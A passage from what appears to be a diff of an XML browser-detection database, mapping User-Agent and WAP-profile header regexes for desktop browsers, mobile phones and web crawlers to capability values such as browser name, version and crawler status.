+  <Identification Type="Header" Name="User-Agent" Match="^Mozilla/5\.0\s\(compatible;\s(?'Browser'[^;]*);" />
+  <Capability Name="browser" Value="${Browser}" />
+  <Capability Name="version" Value="0.0" />
+</Browser>
+<Browser Id="855" ParentId="813" Prority="" Name="Mozilla4CompatibleA">
+  <Identification Type="Header" Name="User-Agent" Match="^Mozilla/4\.0\s\(compatible;\s(?'Browser'[^/\d;\)]*)/(?'version'\d+\.\d+([^;]*)?);" />
+  <Capability Name="browser" Value="${Browser}" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="856" ParentId="813" Prority="" Name="Mozilla4CompatibleB">
+  <Identification Type="Header" Name="User-Agent" Match="^Mozilla/4\.0\s\(compatible;\s(?'Browser'[^\s]*)\s(?'version'\d+\.\d+([^;]*)?);" />
+  <Capability Name="browser" Value="${Browser}" />
+  <Capability Name="version" Value="${version}" />
+  <Child Id="927" Name="MSIEMozilla4CompatibleB" Type="Browser" />
+  <Child Id="1132" Name="Opera Linux" Type="Browser" />
+</Browser>
+<Browser Id="857" ParentId="813" Prority="" Name="Mozilla4CompatibleC">
+  <Identification Type="Header" Name="User-Agent" Match="^Mozilla/4\.0\s\(compatible;\s(?'Browser'[^;]*);" />
+  <Capability Name="browser" Value="${Browser}" />
+  <Capability Name="version" Value="0.0" />
+  <Child Id="928" Name="Malformed6" Type="Browser" />
+</Browser>
+<Browser Id="858" ParentId="813" Prority="" Name="Mozilla3CompatibleA">
+  <Identification Type="Header" Name="User-Agent" Match="^Mozilla/3\.0\s\(compatible;\s(?'Browser'[^/\d;\)]*)/(?'version'\d+\.\d+([^;]*)?);" />
+  <Capability Name="browser" Value="${Browser}" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="859" ParentId="813" Prority="" Name="Mozilla3CompatibleB">
+  <Identification Type="Header" Name="User-Agent" Match="^Mozilla/3\.0\s\(compatible;\s(?'Browser'[^\s]*)\s(?'version'\d+\.\d+([^;]*)?);" />
+  <Capability Name="browser" Value="${Browser}" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="860" ParentId="813" Prority="" Name="Mozilla3CompatibleC">
+  <Identification Type="Header" Name="User-Agent" Match="^Mozilla/3\.0\s\(compatible;\s(?'Browser'[^;]*);" />
+  <Capability Name="browser" Value="${Browser}" />
+  <Capability Name="version" Value="0.0" />
+</Browser>
+<Browser Id="861" ParentId="813" Prority="" Name="Mozilla2CompatibleA">
+  <Identification Type="Header" Name="User-Agent" Match="^Mozilla/2\.\d\s\(compatible;\s(?'Browser'[^/\d;\)]*)/(?'version'\d+\.\d+([^;]*)?);" />
+  <Capability Name="browser" Value="${Browser}" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="862" ParentId="813" Prority="" Name="Mozilla2CompatibleB">
+  <Identification Type="Header" Name="User-Agent" Match="^Mozilla/2\.0\s\(compatible;\s(?'Browser'[^\s]*)\s(?'version'\d+\.\d+([^;]*)?);" />
+  <Capability Name="browser" Value="${Browser}" />
+  <Capability Name="version" Value="${version}" />
+  <Child Id="929" Name="MSIEMozilla2CompatibleB" Type="Browser" />
+</Browser>
+<Browser Id="863" ParentId="813" Prority="" Name="Planetweb">
+  <Identification Type="Header" Name="User-Agent" Match="Planetweb/(?'versionString'(?'browserMajorVersion'\d+)\.(?'browserMinorVersion'\d+))" />
+  <Capability Name="browser" Value="Planetweb" />
+  <Capability Name="mobileDeviceManufacturer" Value="Sony" />
+  <Capability Name="isMobileDevice" Value="True" />
+  <Capability Name="version" Value="${versionString}" />
+</Browser>
+<Browser Id="864" ParentId="813" Prority="" Name="PlayStationPortable">
+  <Identification Type="Header" Name="User-Agent" Match="Mozilla/4\.0\s\(PSP\s\(PlayStation\sPortable\);\s(?'versionString'(?'browserMajorVersion'\d+)\.(?'browserMinorVersion'\d+))\)" />
+  <Capability Name="browser" Value="PlayStation Portable" />
+  <Capability Name="version" Value="${versionString}" />
+  <Capability Name="mobileDeviceManufacturer" Value="Sony" />
+  <Capability Name="crawler" Value="False" />
+  <Capability Name="isMobileDevice" Value="True" />
+</Browser>
+<Browser Id="865" ParentId="813" Prority="" Name="PlayStation3">
+  <Identification Type="Header" Name="User-Agent" Match="Mozilla/5\.0\s\(PLAYSTATION\s3;\s1\.00\)" />
+  <Capability Name="browser" Value="PlayStation" />
+  <Capability Name="version" Value="3.0" />
+  <Capability Name="crawler" Value="False" />
+  <Capability Name="isMobileDevice" Value="False" />
+</Browser>
+<Browser Id="866" ParentId="813" Prority="" Name="MacMSWord">
+  <Identification Type="Header" Name="User-Agent" Match="Word/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="Microsoft Word" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="867" ParentId="813" Prority="" Name="Malformed5">
+  <Identification Type="Header" Name="User-Agent" Match="compatible:" />
+  <Capability Name="crawler" Value="True" />
+  <Capability Name="browser" Value="Malformed User-Agent" />
+  <Capability Name="version" Value="0.0" />
+</Browser>
+<Browser Id="868" ParentId="813" Prority="" Name="Malformed7">
+  <Identification Type="Header" Name="User-Agent" Match="compatible;[^\s]" />
+  <Capability Name="crawler" Value="True" />
+  <Capability Name="browser" Value="Malformed User-Agent" />
+  <Capability Name="version" Value="0.0" />
+</Browser>
+<Browser Id="869" ParentId="813" Prority="" Name="Malformed8">
+  <Identification Type="Header" Name="User-Agent" Match="compatible ;" />
+  <Capability Name="crawler" Value="True" />
+  <Capability Name="browser" Value="Malformed User-Agent" />
+  <Capability Name="version" Value="0.0" />
+</Browser>
+<Browser Id="870" ParentId="813" Prority="" Name="FeedfetcherGoogle2">
+  <Identification Type="Header" Name="User-Agent" Match="Feedfetcher-Google" />
+  <Capability Name="browser" Value="Feedfetcher-Google" />
+  <Capability Name="version" Value="0.0" />
+  <Capability Name="crawler" Value="true" />
+  <Capability Name="isMobileDevice" Value="false" />
+</Browser>
+<Browser Id="871" ParentId="813" Prority="" Name="IEMobile2">
+  <Identification Type="Header" Name="User-Agent" Match="IEMobile.(?'version'\d+(\.\d+?)\w*)" />
+  <Capture Type="Header" Name="User-Agent" Match="MSIE (?'msieMajorVersion'\d+)" />
+  <Capability Name="browser" Value="IEMobile" />
+  <Capability Name="isMobileDevice" Value="true" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="872" ParentId="818" Prority="" Name="Nokia">
+  <Identification Type="Header" Name="User-Agent" Match="Nokia(?'Model'\d{4}i)|Nokia(?'Model'\d{4}I)|Nokia(?'Model'\d{4})|Nokia.(?'Model'\d{4})|Nokia(?'Model'[^/]*)" />
+  <Capture Type="Header" Name="User-Agent" Match="Nokia[^/]*/(?'versionString'(?'browserMajorVersion'\d*)\.(?'browserMinorVersion'\d+)[^\s]*)" />
+  <Capture Type="Header" Name="User-Agent" Match="/\d\.\d\s\((?'versionString'(?'browserMajorVersion'\d*)\.(?'browserMinorVersion'\d+)[^\)]*)" />
+  <Capability Name="browser" Value="Nokia" />
+  <Capability Name="version" Value="${versionString}" />
+  <Capability Name="isMobileDevice" Value="True" />
+  <Capability Name="mobileDeviceManufacturer" Value="Nokia" />
+  <Capability Name="mobileDeviceModel" Value="${Model}" />
+</Browser>
+<Browser Id="873" ParentId="818" Prority="" Name="UPBrowser">
+  <Identification Type="Header" Name="User-Agent" Match="(UP\.Browser)|(UP/)" />
+  <Capture Type="Header" Name="User-Agent" Match="BlackBerry(?'deviceID'\S*)/" />
+  <Capture Type="Header" Name="User-Agent" Match="^(?'deviceID'[^/]*)/[^\s]*\sUP\.Browser/((?'browserMajorVersion'\d*)\.(?'browserMinorVersion'\d+)\S*)" />
+  <Capture Type="Header" Name="User-Agent" Match="((?'deviceID'\S*) UP/\S* UP\.Browser/((?'browserMajorVersion'\d*)\.(?'browserMinorVersion'\d+)\S*) UP\.Link/)" />
+  <Capture Type="Header" Name="User-Agent" Match="((?'deviceID'\S*)/\S* UP(\.Browser)*/((?'browserMajorVersion'\d*)\.(?'browserMinorVersion'\d+)\S*))" />
+  <Capture Type="Header" Name="User-Agent" Match="(UP\.Browser/((?'browserMajorVersion'\d*)\.(?'browserMinorVersion'\d+)\S*)-(?'deviceID'\S*) UP\.Link/)" />
+  <Capture Type="Header" Name="User-Agent" Match="((?'deviceID'\S*) UP\.Browser/((?'browserMajorVersion'\d*)\.(?'browserMinorVersion'\d+)\S*) UP\.Link/)" />
+  <Capture Type="Header" Name="User-Agent" Match="((?'deviceID'\S*)/(?'DeviceVersion'\S*) UP/((?'browserMajorVersion'\d*)\.(?'browserMinorVersion'\d+)\S*))" />
+  <Capture Type="Header" Name="User-Agent" Match="((?'deviceID'\S*)/(?'DeviceVersion'\S*) UP.Browser/((?'browserMajorVersion'\d*)\.(?'browserMinorVersion'\d+)\S*))" />
+  <Capture Type="Header" Name="User-Agent" Match="((?'deviceID'\S*) UP.Browser/((?'browserMajorVersion'\d*)\.(?'browserMinorVersion'\d+)\S*))" />
+  <Capability Name="browser" Value="Phone.com" />
+  <Capability Name="version" Value="${browserMajorVersion}${browserMinorVersion}" />
+  <Capability Name="mobileDeviceModel" Value="${deviceID}" />
+  <Child Id="932" Name="UPBrowserMOT" Type="Browser" />
+  <Child Id="931" Name="UPBrowserSAGEM" Type="Browser" />
+  <Child Id="930" Name="UPBrowserSAMSUNG" Type="Browser" />
+</Browser>
+<Browser Id="874" ParentId="818" Prority="" Name="OceanBlackBerry">
+  <Identification Type="Header" Name="User-Agent" Match="BlackBerry" />
+  <Capture Type="Header" Name="User-Agent" Match="BlackBerry(?'deviceID'\S*)/(?'versionString'(?'browserMajorVersion'\d+)\.(?'browserMinorVersion'\d+))" />
+  <Capture Type="Header" Name="User-Agent" Match="BlackBerry/(?'versionString'(?'browserMajorVersion'\d+)\.(?'browserMinorVersion'\d+))" />
+  <Capability Name="browser" Value="RIM Browser" />
+  <Capability Name="isMobileDevice" Value="True" />
+  <Capability Name="mobileDeviceModel" Value="${deviceID}" />
+  <Capability Name="version" Value="${versionString}" />
+</Browser>
+<Browser Id="875" ParentId="818" Prority="" Name="OceanMIB">
+  <Identification Type="Header" Name="User-Agent" Match="MOT-(?'deviceID'\S*)/.*|MOT-(?'deviceID'\S*).*|Motorola.(?'deviceID'\S*);" />
+  <Capture Type="Header" Name="User-Agent" Match=" MIB/(?'versionString'(?'browserMajorVersion'\d+)\.(?'browserMinorVersion'\d+)\.\d*)| MIB/(?'versionString'(?'browserMajorVersion'\d+)\.(?'browserMinorVersion'\d+))" />
+  <Capture Type="Header" Name="User-Agent" Match=" MIB/BER(?'versionString'(?'browserMajorVersion'\d+)\.(?'browserMinorVersion'\d+))" />
+  <Capability Name="browser" Value="Motorola Internet Browser" />
+  <Capability Name="mobileDeviceManufacturer" Value="Motorola" />
+  <Capability Name="mobileDeviceModel" Value="${deviceID}" />
+  <Capability Name="version" Value="${versionString}" />
+</Browser>
+<Browser Id="876" ParentId="818" Prority="" Name="portalmmm">
+  <Identification Type="Header" Name="User-Agent" Match="portalmmm" />
+  <Capability Name="browser" Value="portalmmm" />
+</Browser>
+<Browser Id="877" ParentId="818" Prority="" Name="Ericsson">
+  <Identification Type="Header" Name="User-Agent" Match="(Ericsson(?'deviceID'[^/]+)/(?'deviceVer'.*))|(Ericsson(?'deviceID'[^/]+)/)" />
+  <Capture Type="Header" Name="User-Agent" Match="SEMC-Browser/(?'versionString'(?'browserMajorVersion'\d+)\.(?'browserMinorVersion'\d+(\.\d+)?))" />
+  <Capability Name="browser" Value="Sony Ericsson" />
+  <Capability Name="mobileDeviceManufacturer" Value="Ericsson" />
+  <Capability Name="mobileDeviceModel" Value="${deviceID}" />
+  <Capability Name="version" Value="${versionString}" />
+</Browser>
+<Browser Id="878" ParentId="818" Prority="" Name="SAMSUNGAUMIC">
+  <Identification Type="Header" Name="User-Agent" Match="Samsung-(?'Model'[^\s]*)|Samsung-(?'Model'[^/]*)|SAMSUNG-(?'Model'[^/]*)|SEC-(?'Model'[^/]*)|SGH-(?'Model'[^/]*)|SCH-(?'Model'[^/]*)" />
+  <Identification Type="Header" Name="User-Agent" Match="AU-MIC-[^/]*/(?'versionString'(?'browserMajorVersion'\d+)\.(?'browserMinorVersion'\d+))" />
+  <Capability Name="browser" Value="AU System" />
+  <Capability Name="mobileDeviceManufacturer" Value="Samsung" />
+  <Capability Name="mobileDeviceModel" Value="${Model}" />
+  <Capability Name="version" Value="${versionString}" />
+</Browser>
+<Browser Id="879" ParentId="818" Prority="" Name="POCKETIE">
+  <Identification Type="Header" Name="User-Agent" Match="Mozilla/\S* \(compatible; MSIE (?'versionString'(?'browserMajorVersion'\d+)\.(?'browserMinorVersion'\d+(\.\d+)?));\D* Windows CE(;(?'deviceID' \D\w*))?(; (?'screenWidth'\d+)x(?'screenHeight'\d+))?" />
+  <Capability Name="browser" Value="IEMobile" />
+  <Capability Name="mobileDeviceModel" Value="${deviceID}" />
+  <Capability Name="version" Value="${versionString}" />
+  <Child Id="933" Name="IEMobileMozilla" Type="GateWay" />
+  <Child Id="935" Name="POCKETIEModel" Type="Browser" />
+  <Child Id="934" Name="SAMSUNGAUPOCKET" Type="Browser" />
+</Browser>
+<Browser Id="880" ParentId="818" Prority="" Name="xIEMobile">
+  <Identification Type="Header" Name="User-Agent" Match="IEMobile\s(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="IEMobile" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="881" ParentId="820" Prority="" Name="SpoofMSIE2">
+  <Identification Type="Header" Name="User-Agent" Match="\sMSIE" />
+  <Identification Type="Header" Name="User-Agent" NonMatch="bot" />
+  <Capability Name="crawler" Value="True" />
+  <Capability Name="browser" Value="Malformed MSIE" />
+  <Capability Name="version" Value="0.0" />
+  <Child Id="936" Name="MSIECrawler" Type="Browser" />
+  <Child Id="938" Name="MSNBOT_Mobile" Type="Browser" />
+  <Child Id="937" Name="MSSearch" Type="Browser" />
+  <Child Id="939" Name="ScanAlert" Type="Browser" />
+</Browser>
+<Browser Id="882" ParentId="820" Prority="" Name="XenuLinkSleuth_OLD">
+  <Identification Type="Header" Name="User-Agent" Match="Windows NT 11\.0|WinNT 11\.0" />
+  <Capability Name="crawler" Value="True" />
+  <Capability Name="browser" Value="Xenu Link Sleuth" />
+</Browser>
+<Browser Id="883" ParentId="820" Prority="" Name="OceanSpiders">
+  <Identification Type="Header" Name="User-Agent" Match="(?i-s:crawler|bot|spider|larbin|search|indexer|archiver|heritrix|HttpClient|Nutch|libwww|Ask\sJeeves|thumbnails|CerberianDrtrs|Cerberian Drtrs|Bluecoat\sDRTR|Slurp|HTTrack|Indy\sLibrary|picmole|research\sproject|WebCapture|ScanAlert|Mozlila|curl)" />
+  <Capture Type="Header" Name="User-Agent" Match="^Mozilla/\d\.\d[\s|\+]\(compatible;[\s|\+](?'browser'[\s|/|\-]+)[\s/\-](?'version'(?'major'\d+)\.(?'minor'\d+(\.\d+)?))" />
+  <Capture Type="Header" Name="User-Agent" Match="^Mozilla/\d\.\d[\s|\+]\(compatible;[\s|\+](?'browser'[^/\d;\)]*)/(?'version'(?'major'\d+)\.(?'minor'\d+)([^;]*)?);" />
+  <Capture Type="Header" Name="User-Agent" Match="^Mozilla/\d\.\d[\s|\+]\(compatible;[\s|\+](?'browser'[\s|\+]*)\s(?'version'(?'major'\d+)\.(?'minor'\d+)([^;]*)?);" />
+  <Capture Type="Header" Name="User-Agent" Match="^Mozilla[^(]*\(compatible; (?'browser'.+)[ /](?'version'(?'major'\d+)\.(?'minor'\d+(\.\d+)?))|^Mozilla[^(]*\(compatible; (?'browser'.+);|^Mozilla[^(]*\(compatible; (?'browser'.+)[ \)]" />
+  <Capture Type="Header" Name="User-Agent" Match="^(?!Mozilla)(?'browser'[^\s|^/]*)[\s/\-](?'version'(?'major'\d+)\.(?'minor'\d+(\.\d+)?))" />
+  <Capture Type="Header" Name="User-Agent" Match="^Mozilla/\d\.\d[\s|\+]\(.*\)\s(?'browser'[^\s|^/]*)[\s/](?'version'(?'major'\d+)\.(?'minor'\d+(\.\d+)?)\w*)" />
+  <Capture Type="Header" Name="User-Agent" Match="bot/(?'version'\d+\.\d+)" />
+  <Capture Type="Header" Name="User-Agent" Match="^(?'browser'^.*)\s-\s(?'version'(?'major'\d+)\.(?'minor'\d+(\.\d+)?))" />
+  <Capture Type="Header" Name="User-Agent" Match="^(?!Mozilla)^(?'browser'[^\s|^/]*)[\s/\-](?'version'(?'major'\d+)\.(?'minor'\d+(\.\d+)?))" />
+  <Capture Type="Header" Name="User-Agent" Match="(?'browser'[^/]*)/(?'version'(?'major'\d+)\.(?'minor'\d+(\.\d+)?))|(?'browser'^.*)[ /](?'version'(?'major'\d+)\.(?'minor'\d+(\.\d+)?))" />
+  <Capability Name="browser" Value="Generic Bot" />
+  <Capability Name="version" Value="0.0" />
+  <Capability Name="crawler" Value="True" />
+  <Capability Name="isMobileDevice" Value="False" />
+  <Capability Name="browser" Value="${browser}" />
+  <Capability Name="version" Value="${version}" />
+  <Child Id="969" Name="AdsBotGoogle" Type="Browser" />
+  <Child Id="1138" Name="Amazonbot" Type="Browser" />
+  <Child Id="953" Name="AskJeeves" Type="Browser" />
+  <Child Id="979" Name="BDCbot" Type="Browser" />
+  <Child Id="970" Name="BaiduImagespider" Type="Browser" />
+  <Child Id="961" Name="Baiduspider" Type="Browser" />
+  <Child Id="1129" Name="Bytespider" Type="Browser" />
+  <Child Id="941" Name="Charlotte" Type="Browser" />
+  <Child Id="1141" Name="DomCopBot" Type="Browser" />
+  <Child Id="942" Name="Exabot" Type="Browser" />
+  <Child Id="952" Name="Girafabot" Type="Browser" />
+  <Child Id="945" Name="GoogleBot" Type="Browser" />
+  <Child Id="978" Name="GooglebotMediapartnersoceanspiders" Type="Browser" />
+  <Child Id="967" Name="GooglebotMobile" Type="Browser" />
+  <Child Id="977" Name="GooglebotNews" Type="Browser" />
+  <Child Id="955" Name="HTTrack" Type="Browser" />
+  <Child Id="943" Name="IBMResearchWebCrawler" Type="Browser" />
+  <Child Id="947" Name="IRLbot" Type="Browser" />
+  <Child Id="956" Name="IndyLibrary" Type="Browser" />
+  <Child Id="1142" Name="IonCrawl" Type="Browser" />
+  <Child Id="951" Name="JakartaCommonsHttpClient" Type="Browser" />
+  <Child Id="1150" Name="LightspeedSystemsCrawler" Type="Browser" />
+  <Child Id="948" Name="MJ12bot" Type="Browser" />
+  <Child Id="1139" Name="Mail.RU_Bot" Type="Browser" />
+  <Child Id="968" Name="Malformed9" Type="Browser" />
+  <Child Id="1143" Name="Nicecrawler" Type="Browser" />
+  <Child Id="940" Name="Nutch" Type="Browser" />
+  <Child Id="974" Name="OceanSpidersFixVersion1" Type="GateWay" />
+  <Child Id="976" Name="OceanSpidersFixVersion2" Type="GateWay" />
+  <Child Id="975" Name="PetalBot" Type="Browser" />
+  <Child Id="1140" Name="Screaming Frog SEO Spider" Type="Browser" />
+  <Child Id="1137" Name="SemanticScholarBot" Type="Browser" />
+  <Child Id="957" Name="Slurp" Type="Browser" />
+  <Child Id="971" Name="SnapPreviewBot" Type="Browser" />
+  <Child Id="1149" Name="Tailrank" Type="Browser" />
+  <Child Id="1148" Name="TweetmemeBot" Type="Browser" />
+  <Child Id="963" Name="Twicelerpider1" Type="Browser" />
+  <Child Id="964" Name="Twicelerpider2" Type="Browser" />
+  <Child Id="962" Name="VoilaBot" Type="Browser" />
+  <Child Id="944" Name="WISEnutbot" Type="Browser" />
+  <Child Id="959" Name="WukongBot" Type="Browser" />
+  <Child Id="958" Name="YahooMMCrawler" Type="Browser" />
+  <Child Id="966" Name="YahooSeeker" Type="Browser" />
+  <Child Id="960" Name="YodaoBot" Type="Browser" />
+  <Child Id="965" Name="YodaoBotMobile" Type="Browser" />
+  <Child Id="1168" Name="attack2" Type="Browser" />
+  <Child Id="973" Name="gsacrawler" Type="Browser" />
+  <Child Id="949" Name="heritrix" Type="Browser" />
+  <Child Id="946" Name="iaarchiver" Type="Browser" />
+  <Child Id="954" Name="larbin" Type="Browser" />
+  <Child Id="950" Name="libwwwperl" Type="Browser" />
+  <Child Id="972" Name="yacybot" Type="Browser" />
+</Browser>
+<Browser Id="884" ParentId="821" Prority="" Name="Curl">
+  <Identification Type="Header" Name="User-Agent" Match="curl/(?'version'\d+\.\d+\.\d+)|curl/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="crawler" Value="True" />
+  <Capability Name="browser" Value="Curl" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="885" ParentId="821" Prority="" Name="Pythonurllib">
+  <Identification Type="Header" Name="User-Agent" Match="Python-urllib/(?'version'\d+\.\d+\.\d+)|Python-urllib/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="crawler" Value="True" />
+  <Capability Name="browser" Value="Python-urllib" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="886" ParentId="821" Prority="" Name="MicrosoftURLControl">
+  <Identification Type="Header" Name="User-Agent" Match="Microsoft\sURL\sControl\s\-\s(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="crawler" Value="True" />
+  <Capability Name="browser" Value="Microsoft URL Control" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="887" ParentId="821" Prority="" Name="DefaultJava">
+  <Identification Type="Header" Name="User-Agent" Match="Java/(?'version'\d+\.\d+\w*)|Java[ /](?'version'\d+\.\d+\w*)" />
+  <Capability Name="crawler" Value="True" />
+</Browser>
+<Browser Id="888" ParentId="821" Prority="" Name="findlinks">
+  <Identification Type="capability" Name="browser" Match="findlinks" />
+  <Capability Name="crawler" Value="True" />
+</Browser>
+<Browser Id="889" ParentId="821" Prority="" Name="LWPSimple">
+  <Identification Type="capability" Name="browser" Match="LWP::Simple" />
+  <Capability Name="browser" Value="LWP::Simple" />
+  <Capability Name="crawler" Value="True" />
+</Browser>
+<Browser Id="890" ParentId="821" Prority="" Name="Malformed3">
+  <Identification Type="Header" Name="User-Agent" Match="^FireFox" />
+  <Capability Name="crawler" Value="True" />
+  <Capability Name="browser" Value="Malformed User-Agent" />
+  <Capability Name="version" Value="0.0" />
+</Browser>
+<Browser Id="891" ParentId="821" Prority="" Name="XenuLinkSleuth">
+  <Identification Type="Header" Name="User-Agent" Match="Xenu Link Sleuth" />
+  <Capability Name="crawler" Value="True" />
+  <Capability Name="browser" Value="Xenu Link Sleuth" />
+</Browser>
+<Browser Id="892" ParentId="821" Prority="" Name="webcollage">
+  <Identification Type="Header" Name="User-Agent" Match="webcollage" />
+  <Capability Name="crawler" Value="True" />
+  <Capability Name="browser" Value="webcollage" />
+</Browser>
+<Browser Id="893" ParentId="821" Prority="" Name="Wget">
+  <Identification Type="Header" Name="User-Agent" Match="Wget" />
+  <Capability Name="crawler" Value="True" />
+  <Capability Name="browser" Value="Wget" />
+</Browser>
+<Browser Id="894" ParentId="821" Prority="" Name="WordPress">
+  <Identification Type="Header" Name="User-Agent" Match="WordPress" />
+  <Capability Name="crawler" Value="True" />
+</Browser>
+<Browser Id="895" ParentId="821" Prority="" Name="PHPBrowserCapabilitiesProject">
+  <Identification Type="Header" Name="User-Agent" Match="PHP Browser Capabilities Project" />
+  <Capability Name="crawler" Value="True" />
+</Browser>
+<Browser Id="896" ParentId="821" Prority="" Name="Malformed10">
+  <Identification Type="Header" Name="User-Agent" Match="^Http_User_Agent" />
+  <Capability Name="crawler" Value="True" />
+  <Capability Name="browser" Value="Malformed User-Agent" />
+  <Capability Name="version" Value="0.0" />
+</Browser>
+<Browser Id="898" ParentId="831" Prority="" Name="SamsungLX550V09">
+  <Identification Type="Header" Name="x-wap-profile" Match="LX550V09\.rdf" />
+  <Capability Name="browser" Value="AU System" />
+  <Capability Name="version" Value="2.0" />
+  <Capability Name="mobileDeviceModel" Value="LX550" />
+  <Capability Name="mobileDeviceManufacturer" Value="LG" />
+</Browser>
+<Browser Id="899" ParentId="831" Prority="" Name="SamsungMM7400">
+  <Identification Type="Header" Name="x-wap-profile" Match="Sanyo/MM7400/1030SP\.rdf" />
+  <Capability Name="browser" Value="NetFront" />
+  <Capability Name="version" Value="3.1" />
+  <Capability Name="mobileDeviceModel" Value="MM7400" />
+  <Capability Name="mobileDeviceManufacturer" Value="Sanyo" />
+</Browser>
+<Browser Id="900" ParentId="831" Prority="" Name="SamsungSPHM560">
+  <Identification Type="Header" Name="x-wap-profile" Match="Samsung/SPH-M560/CJ29\.rdf" />
+  <Capability Name="browser" Value="NetFront" />
+  <Capability Name="version" Value="3.5" />
+  <Capability Name="mobileDeviceModel" Value="SPH-M560" />
+  <Capability Name="mobileDeviceManufacturer" Value="Samsung" />
+</Browser>
+<Browser Id="901" ParentId="836" Prority="" Name="SamsungZ107UAProf">
+  <Identification Type="Header" Name="x-wap-profile" Match="Z107UAProf\.rdf" />
+  <Capability Name="browser" Value="Samsung Mobile Browser" />
+  <Capability Name="version" Value="3.0" />
+  <Capability Name="mobileDeviceModel" Value="Z107" />
+</Browser>
+<Browser Id="902" ParentId="836" Prority="" Name="SamsungZ140VUAProf">
+  <Identification Type="Header" Name="x-wap-profile" Match="Z140VUAProf" />
+  <Capability Name="browser" Value="Phone.com" />
+  <Capability Name="version" Value="7.0.2" />
+  <Capability Name="mobileDeviceModel" Value="SGH-Z140" />
+</Browser>
+<Browser Id="903" ParentId="837" Prority="" Name="aMobile2SonyEricssondeviceID">
+  <Identification Type="Header" Name="User-Agent" Match="SonyEricsson(?'deviceID'[^/|^\s]*)" />
+  <Capability Name="mobileDeviceModel" Value="${deviceID}" />
+</Browser>
+<Browser Id="904" ParentId="840" Prority="" Name="SamsungSCHR56">
+  <Identification Type="Header" Name="x-wap-profile" Match="sam-r560.xml" />
+  <Capability Name="browser" Value="Phone.com" />
+  <Capability Name="version" Value="6.2.3.8" />
+  <Capability Name="mobileDeviceModel" Value="SCH-R56" />
+  <Capability Name="mobileDeviceManufacturer" Value="Samsung" />
+</Browser>
+<Browser Id="905" ParentId="843" Prority="" Name="OperaMiniphone1">
+  <Identification Type="Header" Name="x-operamini-phone" Match="(?'Manufacturer'.+)\s\#\s(?'deviceID'.+)" />
+  <Capability Name="mobileDeviceManufacturer" Value="${Manufacturer}" />
+  <Capability Name="mobileDeviceModel" Value="${deviceID}" />
+</Browser>
+<Browser Id="906" ParentId="843" Prority="" Name="OperaMiniphone3">
+  <Identification Type="Header" Name="x-operamini-phone" Match="(?'Manufacturer'.+)\s\#" />
+  <Capability Name="mobileDeviceManufacturer" Value="${Manufacturer}" />
+</Browser>
+<Browser Id="907" ParentId="847" Prority="" Name="IE_VersionX">
+  <Identification Type="Header" Name="User-Agent" Match="(?'layoutEngine'Trident)/(?'layoutVersion'\d+\.0);\s(?'extra'[^)]*)rv:(?'version'\d+\.\d+(\.\d+)?)\)\slike\sGecko" />
+  <Capability Name="browser" Value="Microsoft Internet Explorer" />
+  <Capability Name="layoutEngineVersion" Value="${layoutVersion}" />
+  <Capability Name="version" Value="${version}" />
+  <Capability Name="layoutEngine" Value="${layoutEngine}" />
+</Browser>
+<Browser Id="908" ParentId="848" Prority="" Name="MozillaFireFoxA">
+  <Identification Type="Header" Name="User-Agent" NonMatch="Epiphany" />
+  <Identification Type="Header" Name="User-Agent" Match="Firefox/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="Firefox" />
+  <Capability Name="version" Value="${version}" />
+  <Child Id="980" Name="FireFoxMobile" Type="Browser" />
+  <Child Id="981" Name="Flock" Type="Browser" />
+  <Child Id="982" Name="GoogleImageProxy" Type="Browser" />
+</Browser>
+<Browser Id="909" ParentId="848" Prority="" Name="GeckoBasic">
+  <Samples Name="User-Agent" Value="Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:52.9) Gecko/20100101 Goanna/3.4 Firefox/52.9 PaleMoon/27.9.0" />
+  <Identification Type="Header" Name="User-Agent" Match="Gecko/(?'layoutEngineVersion'\d{8,10})\s(Ubuntu/dapper\-security\s)?(\(.*\)\s)?(?'browser'[^/\d]*)/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="${browser}" />
+  <Capability Name="version" Value="${version}" />
+  <Capability Name="layoutEngineVersion" Value="${layoutEngineVersion}" />
+  <Capability Name="layoutEngine" Value="Gecko" />
+  <Child Id="988" Name="DebianIceweasel" Type="Browser" />
+  <Child Id="992" Name="GeckoFiresomething" Type="Browser" />
+  <Child Id="984" Name="MozillaBonEcho" Type="Browser" />
+  <Child Id="983" Name="MozillaCamino" Type="Browser" />
+  <Child Id="987" Name="MozillaEpiphany" Type="Browser" />
+  <Child Id="989" Name="MozillaFireFoxB" Type="Browser" />
+  <Child Id="985" Name="MozillaMinefield" Type="Browser" />
+  <Child Id="986" Name="MozillaPhoenix" Type="Browser" />
+  <Child Id="991" Name="Namoroka" Type="Browser" />
+  <Child Id="1172" Name="Opera Gecko" Type="Browser" />
+  <Child Id="990" Name="Shiretoko" Type="Browser" />
+</Browser>
+<Browser Id="910" ParentId="848" Prority="" Name="GeckoNetscape6">
+  <Identification Type="Header" Name="User-Agent" Match="Gecko/\d{8,10}\sNetscape6/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="Netscape" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="911" ParentId="849" Prority="" Name="SpoofGeckoBasic">
+  <Identification Type="Header" Name="User-Agent" Match="Gecko/\d{8,10}\s(?'browser'[^/\d]*)/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="Spoof ${browser}" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="912" ParentId="851" Prority="" Name="Android">
